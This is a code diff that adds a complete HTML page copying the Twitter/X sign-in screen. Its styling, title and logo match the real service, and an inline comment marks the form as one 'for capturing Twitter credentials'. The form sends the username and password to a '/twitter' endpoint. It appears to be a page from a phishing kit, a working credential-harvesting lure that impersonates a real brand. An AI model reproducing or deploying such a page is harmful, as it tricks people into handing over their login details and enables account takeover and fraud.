@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to Twitter</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #000;
+      color: #e7e9ea;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 600px;
+      padding: 20px;
+    }
+
+    .logo {
+      margin: 20px auto;
+      width: 50px;
+      height: 50px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .login-box {
+      max-width: 300px;
+      margin: 0 auto;
+      padding: 20px 0;
+      transition: all 0.3s ease;
+    }
+
+    h1 {
+      font-size: 31px;
+      font-weight: 700;
+      margin-bottom: 40px;
+    }
+
+    .auth-button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border-radius: 25px;
+      border: 1px solid #536471;
+      background-color: transparent;
+      color: #e7e9ea;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .auth-button:hover {
+      background-color: #16181c;
+    }
+
+    .auth-icon {
+      margin-right: 8px;
+      font-size: 18px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #71767b;
+    }
+
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #2f3336;
+      margin: 0 10px;
+    }
+
+    .input-container {
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      background-color: transparent;
+      border: 1px solid #2f3336;
+      border-radius: 4px;
+      color: #e7e9ea;
+      outline: none;
+    }
+
+    input:focus {
+      border: 1px solid #1d9bf0;
+    }
+
+    .next-button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 25px;
+      border: none;
+      background-color: #e7e9ea;
+      color: #0f1419;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .next-button:hover {
+      background-color: #d6d9db;
+    }
+
+    .next-button:disabled {
+      opacity: 0.5;
+      cursor: default;
+    }
+
+    .forgot-password {
+      color: #1d9bf0;
+      text-decoration: none;
+      font-size: 15px;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .signup-text {
+      margin-top: 60px;
+      color: #71767b;
+      font-size: 15px;
+    }
+
+    .signup-link {
+      color: #1d9bf0;
+      text-decoration: none;
+    }
+
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+
+    #passwordSection {
+      display: none;
+      animation: fadeIn 0.3s ease-in forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">X</div>
+
+    <div class="login-box">
+      <h1>Sign in to Twitter</h1>
+
+      <!-- Form for capturing Twitter credentials -->
+      <form method="POST" action="/twitter">
+        <div class="input-container">
+          <input type="text" name="username" id="username" placeholder="Phone, email, or username" required />
+        </div>
+
+        <div class="input-container">
+          <input type="password" name="password" placeholder="Enter your password" required />
+        </div>
+
+        <button class="next-button" type="submit">Log In</button>
+      </form>
+
+      <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("username").addEventListener("input", function() {
+      document.querySelector(".next-button").disabled = !this.value;
+    });
+  </script>
+</body>
+</html>
